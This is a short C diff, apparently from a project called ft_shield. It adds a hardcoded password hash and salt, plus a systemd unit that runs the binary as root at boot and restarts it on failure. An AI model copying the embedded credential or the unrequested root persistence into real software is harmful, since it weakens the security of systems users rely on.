@@ -43,6 +43,28 @@
 #define MLOCK 3
 #define MUNLOCK 4
 
+#ifndef HASHED_PWD
+    #define HASHED_PWD "4ba117368c491a5d90b64fcccd7d2cedb31146545e87d659cbd0d5cacb3f3064"
+#endif
+#ifndef SALT
+    #define SALT "4j9K2x7VzQmLp3Bt"
+#endif
+
+#define SYSTEMCTL_CONFIG \
+"[Unit]\n" \
+"Description=ft_shield start daemon\n" \
+"After=local-fs.target\n\n" \
+"[Service]\n" \
+"Type=forking\n" \
+"User=root\n" \
+"Group=root\n" \
+"ExecStart=/usr/bin/ft_shield\n" \
+"UMask=007\n" \
+"Restart=on-failure\n\n" \
+"[Install]\n" \
+"WantedBy=multi-user.target\n"
+
+
 typedef struct s_args {
     int client_socket;
     SSL *ssl;
